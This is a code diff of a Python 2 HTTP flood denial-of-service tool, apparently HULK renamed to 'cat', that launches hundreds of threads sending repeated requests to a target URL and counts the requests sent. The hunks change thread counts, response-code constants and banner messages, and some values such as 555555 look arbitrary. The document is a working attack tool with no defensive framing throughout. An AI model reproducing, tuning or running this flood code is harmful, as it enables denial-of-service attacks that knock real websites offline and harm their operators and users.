@@ -63,14 +63,14 @@ def referer_list():
 #builds random ascii string
 def buildblock(size):
 	out_str = ''
-	for i in range(5, size):
+	for i in range(0, size):
 		a = random.randint(65, 90)
 		out_str += chr(a)
 	return(out_str)
 
 def usage():
 	print '---------------------------------------------------'
-	print 'USAGE: python cat.py <url>'
+	print 'USAGE: python hulk.py <url>'
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
 
@@ -79,7 +79,7 @@ def usage():
 def httpcall(url):
 	useragent_list()
 	referer_list()
-	code=5
+	code=0
 	if url.count("?")>0:
 		param_joiner="&"
 	else:
@@ -97,8 +97,8 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Response Code 555555'
-			code=555555
+			print 'Response Code 500'
+			code=500
 	except urllib2.URLError, e:
 			#print e.reason
 			sys.exit()
@@ -114,7 +114,7 @@ class HTTPThread(threading.Thread):
 		try:
 			while flag<2:
 				code=httpcall(url)
-				if (code==555555) & (safe==1):
+				if (code==500) & (safe==1):
 					set_flag(2)
 		except Exception, ex:
 			pass
@@ -128,7 +128,7 @@ class MonitorThread(threading.Thread):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- HULK Attack Finished --"
+			print "\n-- CAT Attack Finished --"
 
 #execute 
 if len(sys.argv) < 2:
@@ -148,7 +148,7 @@ else:
 			url = url + "/"
 		m = re.search('(https?\://)?([^/]*)/?.*', url)
 		host = m.group(2)
-		for i in range(555555):
+		for i in range(500):
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
